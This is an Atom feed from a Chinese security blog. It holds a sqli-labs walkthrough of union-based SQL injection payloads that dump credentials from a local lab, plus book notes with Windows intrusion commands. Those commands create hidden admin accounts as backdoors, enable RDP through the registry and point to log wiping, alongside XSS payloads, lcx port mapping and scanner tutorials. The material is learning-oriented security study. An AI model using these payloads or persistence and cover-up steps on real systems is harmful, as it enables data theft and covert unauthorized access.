<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0xMJ&#39;s blog</title>
  
  <subtitle>Love my love~</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xmj.club/"/>
  <updated>2018-02-27T12:02:28.701Z</updated>
  <id>http://0xmj.club/</id>
  
  <author>
    <name>0xMJ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>sqli-labs学习sql注入</title>
    <link href="http://0xmj.club/2018/02/27/sqli-labs%E5%AD%A6%E4%B9%A0sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://0xmj.club/2018/02/27/sqli-labs学习sql注入/</id>
    <published>2018-02-27T12:01:25.000Z</published>
    <updated>2018-02-27T12:02:28.701Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sqli-labs学习sql注入"><a href="#sqli-labs学习sql注入" class="headerlink" title="sqli-labs学习sql注入"></a>sqli-labs学习sql注入</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>结构化查询语言，也叫做SQL，从根本上说是一种处理数据库的编程语言。对于初学者，数据库仅仅是在客户端和服务端进行数据存储。SQL通过结构化查询，关系，面向对象编程等等来管理数据库。编程极客们总是搞出许多这样类型的软件，像MySQL，MS SQL ,Oracle以及Postgresql。现在有一些程序能通过结构化查询来管理大型数据库。脚本小子们一定已经动手体验了类似SQL注入等这样的操作，虽然他们可能已经通过使用自动化工具例如SQL Map或者SQLNinja来实施攻击，但却还不知它真正的原理。在这篇简短的教程里，我将会尽力让你对SQL 注入是怎样工作的，攻击是怎样发生的以及什么是应用程序SQL漏洞有一个深入的理解。我们将要使用的实验室是SQLi Labs，它是一个可以从<a href="https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs免费下载，以便我们研究学习以及编写安全的程序。所以这篇教程对于程序员和安全测试者都将是一次动手实践的机会。</a></p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>从<a href="https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs下载源代码，将源代码复制到Apache</a> webroot 文件夹（htddocs，/var/www） 打开sql-connections文件夹下的“db-creds.inc”文件修改mysql用户名和密码为你自己的打开浏览器，通过localhost的index.html访问文件夹 点击setup/resetDB 链接在你的mysql中创造数据库<br>   开始游戏！</p><h3 id="Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入"><a href="#Less-1-GET-Error-based-Single-quotes-String-基于错误的GET单引号字符型注入" class="headerlink" title="Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)"></a>Less-1 GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</h3><p>第一关就碰壁，原因是服务器端开启的magic_quotes_gpc，会把’转义成\’，在php.ini中将magic_quotes_gpc设置成Off再重启web服务即可。<br>使用火狐浏览器的hackbar插件对url进行修改，首先输入id=1，页面返回正常，<br><a href="http://localhost:9096/sqli-labs-master/Less-1/?id=1" target="_blank" rel="external">http://localhost:9096/sqli-labs-master/Less-1/?id=1</a><br>如图：<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041551_81.png" alt=""><br>通过观察发现，可以遍历id的值来获取用户名和密码<br>可以猜测后台查询语句：<br>select uername,password from talble where id = input（输入的1,2,3。。。）<br>数据库中选取当id等于input的时候，呈现出用户名和密码<br>报错类型<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041551_726.png" alt=""><br>在url框里？id = n后面添加 and 1=1 ，发现返回正常<br> and 1=2 返回也正常</p><p>显然，初步猜测的sql语句错误，因为 1=1和 1=2的返回应该不同<br>此时用 ‘和\测试会报语法错误：</p><p>  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’ LIMIT 0,1’ at line 1 </p><p>对出错信息分析：<br>near ‘’1\’ LIMIT 0,1’ at line 1 </p><p>最外层的单引号是标识错误的，将其隔离</p><pre><code>near &#39;         &#39;   1\   &#39; LIMIT 0,1              &#39; at line 1</code></pre><p>1\是我们的参数输入的值，那么1\外的两个单引号是哪里来的呢。很有可能就是原来SQL查询语句中自带的单引号，所以我们对SQL语句进行猜想。<br>对之前猜测的语句进行修改，添加加上后面爆出错误的 ‘1\’中的单引号：</p><pre><code>select uername,password from talble where id = &#39;input&#39;-----&gt;select uername,password from talble where id = &#39;input 攻击代码&#39;</code></pre><p>————————–方法①：  <strong>引号闭合</strong>—————————–</p><p>构造语句：</p><p>id = 1 ‘ and ‘1’=’1(填入的是’ and ‘1’=’1)</p><p>这是将程序中的单引号闭合起来，至少不会出现语法错误<br>将其放入sql语句中看看，是否和想的一样：(替代input参数）</p><p>select uername,password from talble where id = ‘1   ‘ and ‘1’=’1   ‘</p><p>这里可以看出所有的单引号都已经闭合了，至少不会出现语法错误<br>将这种 ‘ and ‘1’=’1 带入原始url中，发现返回页面正常<br>而 ‘ and ‘1’=’2 带入原始url中，发现返回页面不正常<br>这说明该页面有注入点</p><p>————————方法②：  <strong>注释</strong>———————————–</p><p>sql中的注释符    – （不是只有–，后面还有一个空格）</p><p>id = 1’ and 1=1 –+<br>这里使用+替换空格，–后面必须要跟一个空格才起到注释作用<br>利用注释，可以屏蔽掉那些干扰注入语句的代码，– 后面的语句全被当成注释而不被执行</p><p>现在讲 ‘ and 1=1 –+ 替换 input 值</p><p>select uername,password from talble where id = ‘1   ‘ and 1=1 –+’</p><p>发现 单引号已经闭合，而– 后面的单引号和其他内容都已经被注释。只要保证前面的单引号是正确的，就能达到测试的效果，‘1’的位置，单引号成对出现，and 1=1也是正确的。</p><p>注释符：–+或#（# = %23）<br>用order by判断字段数<br><img src="http://oy0tigw51.bkt.clouddn.com/201710302330_441.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201710302332_642.png" alt=""><br>页面返回正常，说明有3个字段。</p><p>用union select联合查询看一看爆出信息的位置判断显示位(2,3处为显示位)</p><pre><code>playload：http://localhost:9096/sqli-labs-master/Less-1/?id=1&#39; union select 1,2,3%23</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710302335_829.png" alt=""><br>页面的返回值和我预想的不同，预想中页面应该返回1,2,3才对，但是实际也难还是返回Dumb,说明我们构建的SQL语句有问题！！！！啊，原来页面只能返回一行的数据，当我假设id=1时，id=1的数据就占了这一行，这样语句后面的union select联合查询就不显示在页面上了，原来问题出在这里。既然如此，我让id的值没有数据即可，这里我选择让id=-1(0也可以，只要id没有这个值就行)</p><pre><code>playload：http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,3--+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710302341_734.png" alt=""><br>爆数据库名(将显示位替换成mysql函数)</p><pre><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select null,user(),database()%23</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710310045_227.png" alt=""></p><blockquote><p>另一种查询方法<br>通过页面的返回我们可以看到只有第2列和第3列的结果显示在网页上，所以我们就只能用2,3这个位置了，但是两个位置应该是不够用的，这时我们就用到数据库的连接函数了，常用的就concat和concat_ws,还会用到group__concat(可以把查询出来的多行连接起来)，其中concat_ws的第一个参数是连接字符串的分隔符。<br>所以可以构造查询语句<br>?id=-1’ union select null,2,concat_ws(char(32,58,32),user(),database(),version())%23<br><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_913.png" alt=""></p></blockquote><p>首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表<br>SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。<br>TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表<br>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 </p><p>知道了他的数据库名称，我们就要查询数据库下的表和字段，这时我们就要借助数据库中的元数据库构造SQL语句<a href="http://blog.csdn.net/linyt/article/details/52966555" target="_blank" rel="external">元数据库</a></p><p>爆表名(数据库security下的所有表名)<br>方法一：</p><pre><code>playload：http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,group_concat(table_name),group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39;%23</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_36.png" alt=""><br>这样我们就到了所有的表名和字段名，可以看出有用的表名只有id,username和password他们都在users库中，我们选取id和password进行查询，同样适用group_concat()<br>方法二：</p><pre><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;%23</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711041552_648.png" alt=""></p><p>爆列名(表users下的所有列名)<br><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_23.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_646.png" alt=""></p><p>爆出字段值(security.users下所有的账号密码)</p><p><code>http://localhost:9096/sqli-labs-master/Less-1/?id=-1&#39; union select 1,version(),group_concat(username,&#39;:&#39;,password) from security.users%23</code><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_546.png" alt=""><br><img src="http://oy0tigw51.bkt.clouddn.com/201711041553_347.png" alt=""></p><h3 id="less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入"><a href="#less-2-GET-Error-based-Intiger-based-基于错误的GET整型注入" class="headerlink" title="less 2 GET - Error based - Intiger based (基于错误的GET整型注入)"></a>less 2 GET - Error based - Intiger based (基于错误的GET整型注入)</h3><p>报错信息如下<br><img src="http://oy0tigw51.bkt.clouddn.com/201710311025_436.png" alt=""><br>初步猜测sql语句为：<br>select username，password from table where id = input（输入的值）<br>直接添加 and 1=1和 and 1=2，返回页面不同，说明语句应该正确<br>再次在 id = 1后面添加’: 报语法错误<br> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1<br>错误分析：<br>near ‘’ LIMIT 0,1’ at line 1<br>先分离最外层单引号：<br>near ‘     ‘ LIMIT 0,1     ‘ at line 1<br>中间的单引号是手动输入的，说明出错在这里，也就证实了sql语句：<br>select username,password from table where id = input<br>可以看到报错信息是’ LIMIT 0,1说明后台语句可能查询语句为SELECT * FROM users WHERE id=$id LIMIT 0,1，对用户的输入没有经过任何处理，直接带入数据库查询。<br>所以payload如下<br>爆表名</p><pre><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311028_356.png" alt=""><br>爆列名</p><pre><code>http://localhost:9096/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;%23</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311033_702.png" alt=""><br>爆数据</p><pre><code>http://localhost:9096/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(username,&#39;:&#39;,password) from security.users</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311034_397.png" alt=""></p><h3 id="less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>less 3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h3><p><a href="http://localhost:9096/sqli-labs-master/Less-3/?id=1\" target="_blank" rel="external">http://localhost:9096/sqli-labs-master/Less-3/?id=1\</a><br>报出语法错误：<br> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1\’) LIMIT 0,1’ at line 1<br>错误分析：<br>near ‘’1\’) LIMIT 0,1’ at line 1<br>现将外层单引号去掉<br>near ‘              ‘  1\  ‘) LIMIT 0,1           ‘ at line 1<br> 1\ 是手动输入的内容，说明sql语句中还有 (‘’)的内容 ( 注：本来是只有’’)的，但是括号应该也是成对出现的，就变成了(‘’) )<br>所以修改sql语句：<br>select username，password from table where id = (‘input’)<br>爆表名：</p><pre><code>  payload：http://localhost:9096/sqli-labs-master/Less-3/?id=-1&#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311322_158.png" alt=""><br>爆列名、爆数据类似</p><h3 id="less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>less 4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h3><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311327_507.png" alt=""><br>错误分析：<br>near ‘“3\”) LIMIT 0,1’ at line 1<br>先分离最外层的单引号，那是用来标识错误信息的<br>near ‘           “  3\  “) LIMIT 0,1             ‘ at line 1<br>其中 3\ 是手动输入的，还剩下””)<br>说明sql语句中应该有 (“”)   （ 括号也配对）<br>再次猜测sql语句：</p><pre><code>select * username,password from table where id = (&quot;input&quot;)</code></pre><p>爆表名</p><pre><code>http://localhost:9096/sqli-labs-master/Less-4/?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot;--+</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201710311329_194.png" alt=""><br>爆列名、爆数据类似</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sqli-labs学习sql注入&quot;&gt;&lt;a href=&quot;#sqli-labs学习sql注入&quot; class=&quot;headerlink&quot; title=&quot;sqli-labs学习sql注入&quot;&gt;&lt;/a&gt;sqli-labs学习sql注入&lt;/h1&gt;&lt;h3 id=&quot;简介&quot;&gt;&lt;a hr
      
    
    </summary>
    
      <category term="信安" scheme="http://0xmj.club/categories/%E4%BF%A1%E5%AE%89/"/>
    
    
      <category term="sqli-labs" scheme="http://0xmj.club/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>黑客攻防web安全实战详解</title>
    <link href="http://0xmj.club/2018/02/27/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://0xmj.club/2018/02/27/黑客攻防web安全实战详解/</id>
    <published>2018-02-27T11:57:12.000Z</published>
    <updated>2018-02-27T11:57:48.378Z</updated>
    
    <content type="html"><![CDATA[<h1 id="黑客攻防web安全实战详解"><a href="#黑客攻防web安全实战详解" class="headerlink" title="黑客攻防web安全实战详解"></a>黑客攻防web安全实战详解</h1><p><img src="http://oy0tigw51.bkt.clouddn.com/201801051020_332.png" alt=""></p><h2 id="第一章：网络基础"><a href="#第一章：网络基础" class="headerlink" title="第一章：网络基础"></a>第一章：网络基础</h2><p>###计算机网络<br>IP协议和TCP/IP模型<br>ip地址一般为点分十进制，4段，例如192.168.1.1<br>cmd——&gt;ipconfig 查询本机ip地址</p><p>###端口<br>范围在0-65535<br>21端口：FTP服务<br>23端口：Telnet（远程登录）服务<br>25：SMTP发送邮件<br>80：HTTP<br>109、110：POP2，POP3.<br>135：RPC<br>137：NetBIOS<br>3389：远程桌面服务端口<br>5632：远程软件<br>8080：同80用于WWW代理服务</p><p>cmd——&gt;netstat -on可查看本机开放的端口</p><p>Web服务3种协议<br>HTTP-GET 和    HTTP-POST SOAP(XML web service最常用到的) </p><h2 id="第二章：信息搜索与社会工程"><a href="#第二章：信息搜索与社会工程" class="headerlink" title="第二章：信息搜索与社会工程"></a>第二章：信息搜索与社会工程</h2><p>whois查询域名的ip和所有者信息的传输协议<br>SEO综合查询  <a href="http://tool.chinaz.com/" target="_blank" rel="external">站长工具</a></p><h3 id="常见的端口扫描技术："><a href="#常见的端口扫描技术：" class="headerlink" title="常见的端口扫描技术："></a>常见的端口扫描技术：</h3><p>TCP connect()扫描<br>TCP SYN 扫描<br>TCP FIN扫描<br>实战端口扫描</p><ol><li><a href="http://tool.chinaz.com/port" target="_blank" rel="external">站长工具</a></li><li>scanport</li></ol><h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>1.wwwscan<br>2.御剑<br>3.safe3wvs</p><h3 id="web漏洞扫描"><a href="#web漏洞扫描" class="headerlink" title="web漏洞扫描"></a>web漏洞扫描</h3><p>1.APPscan<br>2.x-scan<br>3.nessus<br>4.在线扫描工具scanv<br>5.jsky<br>6.Awvs<br>7.webcruiser</p><h3 id="Googlehack"><a href="#Googlehack" class="headerlink" title="Googlehack"></a>Googlehack</h3><p>www.google.com/intl/xx-hacker 黑客专用入口<br>www.google.com/custom?hl=zh-CN 中文黑客专用信息和资料搜索地址<br>www.google.com/custom?hl=en 英文黑客专用信息和资料搜索地址</p><p>intext或allintext 搜索网站正文<br>intitle或allintitle 搜索网站标题<br>cache搜索缓存内容<br>define 查找关键字的定义<br>filetype：文件名.后缀名   例如：信息安全论文 filetype:doc<br>info搜索网站基本信息<br>inurl或allinurl</p><blockquote><p>inurl: admin/login.asp site:www.sina.con<br>就会搜索这个网站下的包含 admin/login.sap的链接<br>inurl:php?id=    搜索包含:php?id=的链接</p></blockquote><p>intitle 网站标题中包含了查询关键词的网页</p><blockquote><p>[攻防 intitle：实战]</p></blockquote><p>site 指定搜索一个站<br>intext 网站正文</p><blockquote><p>site:xx.com intext:管理<br> site:xx.com intext:manage<br>  site:xx.com intext:admin<br>  site:xx.com intitle:后台<br>   site:xx.com inurl:admin</p></blockquote><p>搜索网站目录<br>index<br>转到父目录<br>to parent directory</p><h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><p>一切利用人自身漏洞的行为都属于社会工程学范畴</p><h3 id="入侵"><a href="#入侵" class="headerlink" title="入侵"></a>入侵</h3><p>net user test1 123 /add<br>其中test1 为用户名 123为密码</p><p>开启3389端口<br>“REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal””Server /v fDenyTSConnections /t REG_DWORD /d 0 /f”<br>提升用户权限：”net localgroup administrators test1 /add”<br>分别执行这两条命令，或者使用开启3389服务工具</p><h4 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h4><p>方法一：安装远控程序<br>方法二：建立隐蔽的用户，并将远程连接端口3389改为其他端口。<br>在建立用户帐户时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏帐户，如“test$”。<br>在字符界面下执行net user命令，就无法查看到这个帐户，但是在图形界面的“本地用户和组”中仍然可以看到。在入侵了一台主机之后，一般都要想办法给自己留一个后门，而给自己加一个管理员组的帐户则是常用的手法。由于带“$”的帐户容易被发现，于是一些人就在帐户的显示名称上下功夫，建立一个看起来和系统帐户类似的名字来迷惑管理员，如admin、sysadmin、Billgates、root等。</p><pre><code>net user chun$ password /add net localgroup administrators chun$ /add 这样我们就利用“命令提示符”成功得建立了一个用户名为“chun$”，密码为“password”的简单“隐藏账户”，并且把该隐藏账户提升为了管理员权限</code></pre><p>方法三：<br>开始 –&gt; 运行 –&gt; regedit –&gt; 确定<br>依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp<br>分支，其下的”PortNumber”键值所对应的就是端口号，将其修改即可。上面设置完成后，需要再依次展开<br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp<br>分支，同样将其下的”PortNumber”键值进行更改。<br>比如可以将端口改为13389</p><h4 id="清脚印"><a href="#清脚印" class="headerlink" title="清脚印"></a>清脚印</h4><p>推荐日志清除工具， aio.exe</p><h4 id="跨站脚本利用"><a href="#跨站脚本利用" class="headerlink" title="跨站脚本利用"></a>跨站脚本利用</h4><p>1.死循环</p><pre><code>&lt;script&gt;while(true)alert(&#39;炸死你！&#39;)&lt;/script&gt;</code></pre><p>2.隐藏访问</p><pre><code>&lt;script&gt;window.location.href=&quot;目标网站&quot;&lt;/script&gt;</code></pre><p>3.更加隐蔽访问</p><pre><code>&lt;iframe src=&quot;目标网站&quot; width=&quot;0&quot; height=&quot;0&quot;&gt; &lt;/iframe&gt;</code></pre><p>4.获取cookie</p><pre><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></pre><h3 id="web权限提升"><a href="#web权限提升" class="headerlink" title="web权限提升"></a>web权限提升</h3><p>mstsc进行远程桌面连接</p><p>内网：<br>1.反相连接<br>让远程服务器自己来向本地计算机请求，从而解决无法主动向内部服务器发送数据的问题。<br>lcx.exe是一款著名的反向连接的内网端口映射工具。<br>本机：lcx-listen 51 3389<br>这条命令的作用是将本地的51端口与3389端口开启监听状态，并且使两端互相开启映射<br>服务器：lcx.exe-slave 192.168.49.151 192.168.129 3389<br>这样3389端口服务器就会向51端口服务器请求连接，并且将从51端口获取的数据传给3389端口。</p><h3 id="基于内网的入侵"><a href="#基于内网的入侵" class="headerlink" title="基于内网的入侵"></a>基于内网的入侵</h3><p>局域网(Local Area Network，LAN)是指在某一区域内由多台计算机互联成的计算机组。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能<br>决定局域网的主要技术要素为：网络拓扑，传输介质与介质访问控制方法。</p><h3 id="内网信息刺探"><a href="#内网信息刺探" class="headerlink" title="内网信息刺探"></a>内网信息刺探</h3><h4 id="获取主机网络信息"><a href="#获取主机网络信息" class="headerlink" title="获取主机网络信息"></a>获取主机网络信息</h4><p>ipconfig查询这台主机的主机名物理mac地址 IP地址 网关地址以及DNS服务器和DHCP服务器地址等信息。在获取了主机网卡信息之后，如果该主机处于域中，还可以通过的命令提示符获取域信息。<br>使用net view 显示当前域或工作组中的计算机列表，<br>使用net view /domain[:Domain Name]指定要查看其可用计算机的域，<br>net user /domain 查看域用户列表<br>net group “domain admins” /domain 查看管理组成员<br>net user Administrator/domain 查看域管理员信息<br>net /help或者net ？获取net命令可操作对象<br>获取主机用户密码</p><h4 id="APR攻击"><a href="#APR攻击" class="headerlink" title="APR攻击"></a>APR攻击</h4><p>APR协议可以通过Ip地址获取MAC地址</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;a href=&quot;#黑客攻防web安全实战详解&quot; class=&quot;headerlink&quot; title=&quot;黑客攻防web安全实战详解&quot;&gt;&lt;/a&gt;黑客攻防web安全实战详解&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;http://oy0tigw51
      
    
    </summary>
    
      <category term="读书摘要" scheme="http://0xmj.club/categories/%E8%AF%BB%E4%B9%A6%E6%91%98%E8%A6%81/"/>
    
    
      <category term="黑客攻防web安全实战详解" scheme="http://0xmj.club/tags/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2web%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-QWASP-ZAP/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-QWASP-ZAP/</id>
    <published>2018-02-27T11:54:20.000Z</published>
    <updated>2018-02-27T11:55:35.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-QWASP-ZAP"><a href="#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-QWASP_ZAP"></a>kali渗透测试之Web渗透-扫描工具-QWASP_ZAP</h1><p>扫描工具-QWASP_ZAP</p><p>十大安全工具之一，集成性工具，功能完善，而且强大。既可做主动扫描，也可做截断代理。开源免费跨平台，简单易用，体验相对混乱，但在主动扫描方面，相对占优。【kali集成】(主动扫描方面比burp好)</p><pre><code>####建议选择第二项####注意检查更新</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251642_866.jpg" alt=""></p><p>更新与插件安装</p><pre><code>安装插件release和beta【release：成熟版  beta：测试版  alpha：不成熟版】</code></pre><p>截断代理【结合手动爬网】</p><pre><code>默认情况下，代理功能自启动1、启动浏览器代理2、</code></pre><p>2、主动扫描</p><pre><code>一、快速爬网扫描二、直接扫描爬到的内容对于要身份认证才能访问的网页无法进行扫描，需要进行身份认证配置Fuzz二、</code></pre><p>结果分析：</p><pre><code>1、查看Code【200 OK】（）若为302，则是重定向2、查看Size Resp.Header是否不同</code></pre><p>暴力破解：</p><pre><code>API功能【程序接口】~http:/zap/【代理已经指向OWASP_ZAP】</code></pre><p>3、使用方法</p><pre><code>0、Persist Session1.四种模式Mode----safe&lt;protect&lt;standard&lt;ATTACK【小心选择扫描模式】2、升级add-ons3、Scan Profile（扫描策略）    右键-&gt;攻击-&gt;Active Scan    自定义扫描策略4、Anti CSRF Tokens【某些网站为了防止CSRF攻击，每次随机生成Tokens】5、扫描https网站时，出现证书报错，通过导入ssl证书，则不会出现错误6、Scope / Contexts（范围） / filter    #Scope  以相同的策略进行扫描（包含context）    #Contexts7、Http Sessions——default session tokens &amp; site session tokens    Session  Properties  #使用默认Manual已能满足大多数，失效再考虑下面#使用表单进行身份认证#脚本认证Script，需自己编写脚本【有脚本模版】#默认情况下，只认定指定的Session的名，必须手动添加其他Session【如：security】 #显示http Session tab    #用于使用不同用户登录审计，判断是否有越权8、Note / tag【添加各种标签，方便审计】9、Passive scan</code></pre><p>############################################################################################</p><p>#实时截断【注意截断时间，需快速】</p><pre><code>##返回的结果也会拦截</code></pre><p>#显示隐藏域</p><p>###隐藏域在客户端是为了降低客户端对服务端的请求过程，提高速度和用户体验。若服务端没对数据进行检验或检查，可进行价格修改和恶意代码注入等</p><pre><code>#被动扫描规则#爬网域值</code></pre><p>##########################################################################################</p><p>扫描标准流程</p><pre><code>设置代理手动爬网自动爬网     #强制浏览web服务器【有可能发现一些web目录】    #强制目录浏览、强制目录和子目录爬网【有各自的字典】主动扫描【active scan】</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot;&gt;&lt;a href=&quot;#kali渗透测试之Web渗透-扫描工具-QWASP-ZAP&quot; class=&quot;headerlink&quot; title=&quot;kali渗透测试之Web渗透-扫描工具-QWASP_ZAP&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="QWASP_ZAP" scheme="http://0xmj.club/tags/QWASP-ZAP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-扫描工具-Vega</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7-Vega/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-扫描工具-Vega/</id>
    <published>2018-02-27T11:51:36.000Z</published>
    <updated>2018-02-27T11:52:13.219Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kali渗透测试之Web渗透-扫描工具-Vega"><a href="#kali渗透测试之Web渗透-扫描工具-Vega" class="headerlink" title="kali渗透测试之Web渗透-扫描工具-Vega"></a>kali渗透测试之Web渗透-扫描工具-Vega</h1><p>##任务6： WEB扫描工具-Vega</p><p> 纯图形化界面，Java编写的开源web扫描器。两种工作模式：扫描模式和代理模式【主流扫描功能】。用于爬站。处理表单，注入测试等。支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="external">http://vega/ca.crt</a></p><p>专注于应用程序代码方面的漏洞</p><p>Vega<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251348_627.jpg" alt=""></p><pre><code>#基于字典发现网站目录</code></pre><p>代理模式</p><p>被动收集信息，结合手动爬站【即页面中能点击的链接全部点击一遍，能提交数据的地方，全部提交一遍】</p><p>连接到网站外面的链接可以暂时不用管<br><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_64.jpg" alt=""></p><pre><code>#设置外部代理服务器</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_630.jpg" alt=""></p><pre><code>#删除user-agent尾部的vega字样</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_272.jpg" alt=""></p><pre><code>#设置代理</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251349_285.jpg" alt=""></p><pre><code>1、setup重置【方便用户初始安装和配置】设置安装完成后，一定要删掉，不能留在服务器。如果权限设置不当，通过非授权访问到，可篡改数据库内容</code></pre><p><img src="http://oy0tigw51.bkt.clouddn.com/201711251350_130.jpg" 